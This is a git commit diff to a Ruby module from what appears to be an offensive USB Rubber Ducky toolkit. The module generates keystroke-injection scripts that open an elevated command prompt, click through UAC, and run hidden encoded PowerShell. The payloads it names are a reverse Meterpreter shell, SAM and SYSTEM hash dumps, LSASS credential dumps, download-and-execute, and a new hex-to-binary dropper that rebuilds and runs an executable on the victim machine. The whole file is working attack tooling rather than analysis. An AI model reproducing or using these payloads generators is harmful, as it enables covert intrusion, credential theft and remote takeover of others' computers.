7e52c24bfebe10332c7ee9f03a0e1faed979f5cf
b00stfr3ak <goduke44@gmail.com>
2013-09-16 01:14:28 -0700

    Added Hex To Bin Payload
    Added the ability to convert a binary to hex and then use powershell to re-create the binary and execute it on the system.
    Also put in methods for uac,no uac and low just incase something better comes out, also makes it look cleaner.

--- lib/ducky_setup.rb
+++ lib/ducky_setup.rb
@@ -2,40 +2,64 @@
 require_relative 'core'
 include MainCommands
 module DuckySetUp
-  def meterpreter_low(encoded_command)
-    File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
+  def admin_with_uac
+    "DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500"
   end
-  def meterpreter_uac(encoded_command)
-    File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
+  def admin_with_out_uac
+    "DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500"
   end
-  def meterpreter_no_uac(encoded_command)
-    File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
+  def low_priv
+    "DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500"
   end
-
-  def hash_dump_uac(encoded_command)
-    File.open("#{text_path}#{hash_dump_file}", 'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  def ducky_meterpreter_low(encoded_command)
+    File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
   end
-  def hash_dump_no_uac(encoded_command)
-    File.open("#{text_path}#{hash_dump_file}", 'w') { |f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER") }
+  def ducky_meterpreter_uac(encoded_command)
+    File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
   end
-  def lsass_uac(encoded_command1,encoded_command2)
-    File.open("#{text_path}#{lsass_dump_file}", 'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
+  def ducky_meterpreter_no_uac(encoded_command)
+    File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
   end
-  def lsass_no_uac(encoded_command1,encoded_command2)
-    File.open("#{text_path}#{lsass_dump_file}", 'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
+  def ducky_hash_dump_uac(encoded_command)
+    File.open("#{text_path}#{hash_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
   end
-  def wget_uac(encoded_command)
-    File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  def ducky_hash_dump_no_uac(encoded_command)
+    File.open("#{text_path}#{hash_dump_file}", 'w') { |f| f.write("#{admin_with_out_uac}\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER") }
   end
-  def wget_no_uac(encoded_command)
-    File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  def ducky_lsass_uac(encoded_command1,encoded_command2)
+    File.open("#{text_path}#{lsass_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
   end
-  def wget_low(encoded_command)
-    File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  def ducky_lsass_no_uac(encoded_command1,encoded_command2)
+    File.open("#{text_path}#{lsass_dump_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
+  end
+  def ducky_wget_uac(encoded_command)
+    File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  end
+  def ducky_wget_no_uac(encoded_command)
+    File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  end
+  def ducky_wget_low(encoded_command)
+    File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  end
+  def ducky_hex_uac(encoded_command)
+    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  end
+  def ducky_hex_no_uac(encoded_command)
+    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  end
+  def ducky_hex_low(encoded_command)
+    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
   end
   def compile_ducky(file_name)
     print_info("Creating Bin File!\n")
-    system("java -jar #{duck_encode_file}encoder.jar -i #{text_path}#{file_name} -o #{file_root}/inject.bin")
-    print_success("Bin File Created!\n")
+    output = `java -jar #{duck_encode_file}encoder.jar -i #{text_path}#{file_name} -o #{file_root}/inject.bin 2>&1`
+    if output =~ /Exception/
+      print_error("Wrong Version of Java\n")
+      print_info("Run update-alternatives --config java and select Java 7\n")
+      exit
+    else
+      print_info(output)
+      print_success("Bin File Created!\n")
+    end
   end
 end
